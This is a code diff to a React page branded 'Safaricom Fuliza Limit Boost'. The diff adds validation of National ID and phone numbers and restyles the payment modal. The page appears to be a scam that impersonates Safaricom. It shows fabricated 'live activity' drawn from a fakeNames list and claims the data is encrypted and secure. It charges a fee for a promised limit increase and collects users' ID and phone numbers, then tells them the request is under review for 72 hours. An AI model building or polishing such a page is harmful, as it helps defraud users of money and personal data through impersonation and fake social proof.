@@ -30,7 +30,9 @@ export default function FulizaBoost() {
   const [phone, setPhone] = useState("");
   const [idNumber, setIdNumber] = useState("");
   const [recent, setRecent] = useState({ name: "", amount: 0 });
+  const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
 
+  /* Activity rotation */
   useEffect(() => {
     const generate = () => {
       const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
@@ -42,8 +44,29 @@ export default function FulizaBoost() {
     return () => clearInterval(interval);
   }, []);
 
+  /* Validation */
+  const validate = () => {
+    const newErrors: any = {};
+
+    if (!/^\d{6,8}$/.test(idNumber)) {
+      newErrors.id = "Enter a valid National ID (6–8 digits)";
+    }
+
+    if (
+      !/^(07\d{8}|2547\d{8})$/.test(phone)
+    ) {
+      newErrors.phone =
+        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
   const handleBuy = async () => {
-    if (!selectedLimit || !phone || !idNumber) return;
+    if (!selectedLimit) return;
+    if (!validate()) return;
+
     setLoading(true);
 
     const BACKEND_URL =
@@ -70,16 +93,24 @@ export default function FulizaBoost() {
     }
   };
 
+  const closeModal = () => {
+    setShowModal(false);
+    setSuccess(false);
+    setPhone("");
+    setIdNumber("");
+    setErrors({});
+  };
+
   return (
     <div className="min-h-screen bg-[#f4faf6] flex justify-center">
       <div className="w-full max-w-md pb-16">
 
-        {/* Header */}
+        {/* HEADER */}
         <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
           Safaricom Fuliza Limit Boost
         </div>
 
-        {/* Subtitle */}
+        {/* CONTENT (unchanged visually but slightly cleaner spacing) */}
         <div className="text-center mt-5 px-6">
           <h2 className="text-xl font-bold text-[#008043]">
             Increase Your Fuliza Allocation
@@ -89,7 +120,6 @@ export default function FulizaBoost() {
           </p>
         </div>
 
-        {/* Trust Features Card */}
         <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
           <div className="flex justify-between text-sm font-medium text-[#008043]">
             <span>✔ Secure Application</span>
@@ -100,7 +130,6 @@ export default function FulizaBoost() {
           </div>
         </div>
 
-        {/* Live Activity */}
         <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
           {recent.name} increased Fuliza to{" "}
           <span className="font-semibold text-[#008043]">
@@ -109,12 +138,10 @@ export default function FulizaBoost() {
           • just now
         </div>
 
-        {/* Section */}
         <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
           Select Preferred Fuliza Limit
         </div>
 
-        {/* Cards */}
         <div className="grid grid-cols-2 gap-4 px-4 mt-4">
           {limits.map((limit) => (
             <div
@@ -136,7 +163,6 @@ export default function FulizaBoost() {
           ))}
         </div>
 
-        {/* Button */}
         <div className="px-4 mt-6">
           <button
             onClick={() => selectedLimit && setShowModal(true)}
@@ -146,68 +172,118 @@ export default function FulizaBoost() {
           </button>
         </div>
 
-        {/* Legal */}
         <div className="text-center text-xs text-gray-500 mt-6 px-6">
           This is a digital facilitation service for Safaricom Fuliza users.
           Processing timelines may vary based on eligibility criteria.
         </div>
 
-        {/* Modal */}
+        {/* MODAL */}
         {showModal && selectedLimit && (
           <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
-            <div className="bg-white w-full max-w-sm rounded-2xl p-6 shadow-2xl">
+            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
 
-              {!success ? (
-                <>
-                  <div className="text-center mb-5">
-                    <h3 className="text-lg font-semibold text-[#008043]">
-                      Your Fuliza limit will be boosted to
-                    </h3>
-                    <p className="text-xl font-bold text-[#00A651] mt-1">
-                      Ksh {selectedLimit.amount.toLocaleString()}
+              {/* Modal Header */}
+              <div className="bg-[#00A651] text-white px-6 py-4">
+                <h3 className="text-sm font-medium">
+                  Secure Fuliza Application
+                </h3>
+                <p className="text-lg font-semibold mt-1">
+                  Limit will be boosted to Ksh {selectedLimit.amount.toLocaleString()}
+                </p>
+              </div>
+
+              <div className="p-6">
+
+                {!success ? (
+                  <>
+                    {/* ID Input */}
+                    <div className="mb-4">
+                      <input
+                        type="text"
+                        placeholder="National ID Number"
+                        value={idNumber}
+                        onChange={(e) => setIdNumber(e.target.value)}
+                        className={`w-full rounded-xl p-3 text-sm border ${
+                          errors.id
+                            ? "border-red-400"
+                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
+                        } outline-none transition`}
+                      />
+                      {errors.id && (
+                        <p className="text-red-500 text-xs mt-1">
+                          {errors.id}
+                        </p>
+                      )}
+                    </div>
+
+                    {/* Phone Input */}
+                    <div className="mb-4">
+                      <input
+                        type="tel"
+                        placeholder="Safaricom Number (07 or 2547...)"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        className={`w-full rounded-xl p-3 text-sm border ${
+                          errors.phone
+                            ? "border-red-400"
+                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
+                        } outline-none transition`}
+                      />
+                      {errors.phone && (
+                        <p className="text-red-500 text-xs mt-1">
+                          {errors.phone}
+                        </p>
+                      )}
+                    </div>
+
+                    {/* Buttons */}
+                    <div className="flex gap-3">
+                      <button
+                        onClick={closeModal}
+                        className="w-1/2 border border-gray-300 py-3 rounded-xl text-sm font-medium"
+                      >
+                        Cancel
+                      </button>
+
+                      <button
+                        onClick={handleBuy}
+                        disabled={loading}
+                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold"
+                      >
+                        {loading
+                          ? "Processing..."
+                          : `Pay Ksh ${selectedLimit.fee}`}
+                      </button>
+                    </div>
+
+                    <p className="text-xs text-gray-500 mt-4 text-center">
+                      Your information is encrypted and securely processed.
                     </p>
+                  </>
+                ) : (
+                  <div className="text-center py-6">
+                    <h3 className="text-lg font-semibold text-[#008043]">
+                      Application Submitted
+                    </h3>
+                    <p className="text-sm text-gray-600 mt-2">
+                      Your Fuliza limit adjustment request is under review.
+                      Processing may take up to 72 hours.
+                    </p>
+
+                    <button
+                      onClick={closeModal}
+                      className="mt-5 bg-[#00A651] text-white px-6 py-2 rounded-xl text-sm"
+                    >
+                      Close
+                    </button>
                   </div>
+                )}
 
-                  <input
-                    type="text"
-                    placeholder="National ID Number"
-                    value={idNumber}
-                    onChange={(e) => setIdNumber(e.target.value)}
-                    className="w-full bg-gray-50 border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 transition rounded-xl p-3 mb-3 text-sm outline-none"
-                  />
-
-                  <input
-                    type="tel"
-                    placeholder="Safaricom M-Pesa Number"
-                    value={phone}
-                    onChange={(e) => setPhone(e.target.value)}
-                    className="w-full bg-gray-50 border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 transition rounded-xl p-3 mb-4 text-sm outline-none"
-                  />
-
-                  <button
-                    onClick={handleBuy}
-                    disabled={loading}
-                    className="w-full bg-[#00A651] text-white py-3 rounded-xl font-semibold"
-                  >
-                    {loading
-                      ? "Processing Secure Payment..."
-                      : `Pay Ksh ${selectedLimit.fee}`}
-                  </button>
-                </>
-              ) : (
-                <div className="text-center">
-                  <h3 className="text-lg font-semibold text-[#008043]">
-                    Application Submitted
-                  </h3>
-                  <p className="text-sm text-gray-600 mt-2">
-                    Your request is under review.
-                    Fuliza limit adjustment may take up to 72 hours.
-                  </p>
-                </div>
-              )}
+              </div>
             </div>
           </div>
         )}
+
       </div>
     </div>
   );
